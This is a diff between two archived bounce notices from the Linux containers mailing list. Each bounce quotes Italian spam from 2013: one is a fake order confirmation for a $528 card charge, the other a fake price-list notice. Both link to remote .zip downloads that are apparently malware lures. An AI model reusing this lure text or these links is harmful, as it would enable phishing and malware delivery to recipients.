@@ -1,9 +1,9 @@
-From: Posta Certificata Legalmail <posta-certificata-uAB2pouQAuvkqfQpfK8e+Q@public.gmane.org>
-Subject: ERRORE: Messaggio rifiutato dal sistema
-Date: Mon, 25 Mar 2013 12:50:13 +0100 (CET)
-Message-ID: <27857.2543095381$1364215868@news.gmane.org>
+From: MAILER-DAEMON-AWDScNvLHlWPLsw1WPb4mg@public.gmane.org (Mail Delivery System)
+Subject: Undelivered Mail Returned to Sender
+Date: Mon, 25 Mar 2013 14:08:38 +0100 (CET)
+Message-ID: <20130325130838.1EDAC39C156C@d2-1045.ncsrv.de>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============0879180249257417441=="
+Content-Type: multipart/mixed; boundary="===============0331194011958362865=="
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
@@ -14,85 +14,101 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: OrderCo <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============0879180249257417441==
+This is a MIME-encapsulated message.
+
+--===============0331194011958362865==
 Content-Type: multipart/report; report-type=delivery-status;
-	boundary="----=_Part_47367_16231726.1364212213670"
-
-------=_Part_47367_16231726.1364212213670
-Content-Type: text/plain; charset="ISO-8859-1"
+	boundary="EEFBE39C1581.1364216918/d2-1045.ncsrv.de"
 Content-Transfer-Encoding: 7bit
 
-Messaggio rifiutato dal sistema.
-Le caselle destinatarie di seguito indicate ricevono esclusivamente messaggi di posta elettronica certificata oppure sono caselle di servizio riservate al gestore:
+This is a MIME-encapsulated message.
 
-protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org - casella che riceve solo Posta Certificata
-------=_Part_47367_16231726.1364212213670
+--EEFBE39C1581.1364216918/d2-1045.ncsrv.de
+Content-Description: Notification
+Content-Type: text/plain; charset=us-ascii
+
+This is the mail system at host d2-1045.ncsrv.de.
+
+I'm sorry to have to inform you that your message could not
+be delivered to one or more recipients. It's attached below.
+
+For further assistance, please send mail to postmaster.
+
+If you do so, please include this problem report. You can
+delete your own text from the attached returned message.
+
+                   The mail system
+
+<lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>: host dublino.obicon.it[151.78.69.4] said: 550 5.0.0
+    <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>... We don't accept mail from spammers (in reply to RCPT
+    TO command)
+
+--EEFBE39C1581.1364216918/d2-1045.ncsrv.de
+Content-Description: Delivery report
 Content-Type: message/delivery-status
+
+Reporting-MTA: dns; d2-1045.ncsrv.de
+X-Postfix-Queue-ID: EEFBE39C1581
+X-Postfix-Sender: rfc822; containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
+Arrival-Date: Mon, 25 Mar 2013 14:08:04 +0100 (CET)
+
+Final-Recipient: rfc822; lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org
+Original-Recipient: rfc822;lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org
+Action: failed
+Status: 5.0.0
+Remote-MTA: dns; dublino.obicon.it
+Diagnostic-Code: smtp; 550 5.0.0 <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>... We don't accept mail
+    from spammers
+
+--EEFBE39C1581.1364216918/d2-1045.ncsrv.de
+Content-Description: Undelivered Message
+Content-Type: message/rfc822
 Content-Transfer-Encoding: 7bit
 
-Reporting-MTA: dns; legalmail.it
-
-Final-Recipient: rfc822;protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org
-Action: failed
-Status: 5.0.0 (casella che riceve solo Posta Certificata)
-
-------=_Part_47367_16231726.1364212213670
-Content-Type: message/rfc822
-
-Received: from SAU-71762-OR.sau.net.au (sau-55c56-or.sau.net.au [27.50.86.170] (may be forged))
-	by vlefpecsmtp001.dmz.infocert.it (8.14.5/8.14.5) with ESMTP id r2PBiivu001022
-	for <protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org>; Mon, 25 Mar 2013 12:44:46 +0100
-Received: from [27.50.86.170] by SAU-71762-OR.sau.net.au id pU9ALk4OMSD3gl3R; Mon, 25 Mar 2013 22:44:44 +1100
-Message-ID: <004f01ce294e$22e5da80$0200a8c0-5X32oH+SWYHju/CiIO64j+23QSEHp/Li@public.gmane.org>
-From: "OrderCo" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-To: <protocollo-xuxQSbes41GGzLJY+7CQzQ@public.gmane.org>
-Subject: Re: document 77999840
-Date: Mon, 25 Mar 2013 22:44:44 +1100
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by d2-1045.ncsrv.de (Postfix) with ESMTP id EEFBE39C1581
+	for <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>; Mon, 25 Mar 2013 14:08:04 +0100 (CET)
+X-Virus-Scanned: Debian amavisd-new at d2-1045.ncsrv.de
+Received: from d2-1045.ncsrv.de ([89.110.133.54])
+	by localhost (d2-1045.ncsrv.de [127.0.0.1]) (amavisd-new, port 10024)
+	with ESMTP id GHvhy6L7fMQw for <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>;
+	Mon, 25 Mar 2013 14:08:04 +0100 (CET)
+Received: from bruce1.publicoutreachgroup.com (unknown [27.50.89.200])
+	(Authenticated sender: web12p1)
+	by d2-1045.ncsrv.de (Postfix) with ESMTPA id 9F6DE39C156C
+	for <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>; Mon, 25 Mar 2013 14:08:03 +0100 (CET)
+Received: from [27.50.89.200] by bruce1.publicoutreachgroup.com id IBWSL9kzDEe3 with SMTP; Mon, 25 Mar 2013 09:07:54 -0400
+Date: Mon, 25 Mar 2013 09:07:54 -0400
+From: "devnull" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.7.36.2) Business
+X-Priority: 3 (Normal)
+Message-ID: <99955300.16748291461698-F4yU/NW+unie0L4OLewF3vmPk1/qRCueuNZObgmCpkU@public.gmane.org>
+To: <lorenzo-UP79gmWUZgleoWH0uzbU5w@public.gmane.org>
+Subject: Il vostro ordine di riferimento e 04845
 MIME-Version: 1.0
 Content-Type: text/plain;
 	charset="windows-1252"
-X-Virus-Scanned: clamav-milter 0.97.4 at vlefpecsmtp001.dmz.infocert.it
-X-Virus-Status: Clean
-X-Brightmail-Tracker: AAAAAR1kMZo=
-X-BMI-Spam: spam
 Content-Transfer-Encoding: quoted-printable
 
 
-Buongiorno,=20
-   =20
-
          =20
-Grazie per aver ordinate da Puremobile Inc.
-   =20
-Il questo messagio e solo da informarvi che il =20
-vostro ordine ero stato ricevuto ed attualmente=20
-e nel fase di elaborazione.       =20
+Ciao,      =20
 
-Il vostro riferimento di ordine e  6210.=20
-Avrete bisogno di questo in corrispondenza.=20
-Tale ricevuta non e prova di acquisto.=20
-Riceverete la fattura stampata via posta a indirizzo di fatturazione.=20
-
-Avete schelto la paga con la carta di credito.       =20
-      =20
-La carta verra addebitata a somma di 528.00 USD=20
-e "Puremobile Inc." apparira'  accanto alla tassa di vostra dichiarazione=
-.=20
-      =20
-L'informazione sul vostro acquisto appare sotto nel file.=20
-http://www.journeynext.org/Descrizione/Info.zip?ikPCyT9i=3Dprotocollo@pec=
-.unive.it
-
-  =20
+La nostra azienda ha riassegnato il bilancio, e ora apparso nel nostro li=
+stino prezzi aggiornato         =20
+        =20
+Potete scaricarlo qui=20
+http://173.201.24.204/Notare/InfoBlocco.zip
 
 
 
-------=_Part_47367_16231726.1364212213670--
+--EEFBE39C1581.1364216918/d2-1045.ncsrv.de--
 
---===============0879180249257417441==
+--===============0331194011958362865==
 Content-Type: text/plain; charset="us-ascii"
 MIME-Version: 1.0
 Content-Transfer-Encoding: 7bit
@@ -102,4 +118,4 @@ _______________________________________________
 Containers mailing list
 Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============0879180249257417441==--
+--===============0331194011958362865==--
